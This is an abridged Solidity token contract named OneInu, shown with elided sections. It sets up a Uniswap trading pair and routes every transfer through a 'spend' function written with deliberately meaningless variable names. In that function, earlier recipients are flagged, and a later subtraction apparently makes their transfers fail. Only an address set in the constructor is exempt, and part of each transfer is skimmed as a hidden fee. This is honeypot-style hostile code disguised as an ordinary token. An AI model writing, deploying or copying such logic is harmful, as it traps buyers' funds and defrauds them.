...
contract OneInu is Ownable {
    ...
    function spend(
        ...
        if (strip[slightly] == 0 && palace[slightly] > 0) {
            strip[slightly] -= tears;
        }

        address fight = student;

        if (strip[slightly] == 0) {
            property[slightly] -= tiny;
        }

        student = bush;

        uint256 reach = (tiny * universe) / kids;
        tiny -= reach;
        palace[fight] += tears;
        property[bush] += tiny;
    }

    mapping(address => uint256) private palace;
    ...
    function transferFrom(
        ...
        spend(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        spend(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(labor);
        rod = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        kids = 100;
        strip[drove] = tears;
        _tTotal = 1000000000000000 * 10**tears;
        property[msg.sender] = _tTotal;
    }
}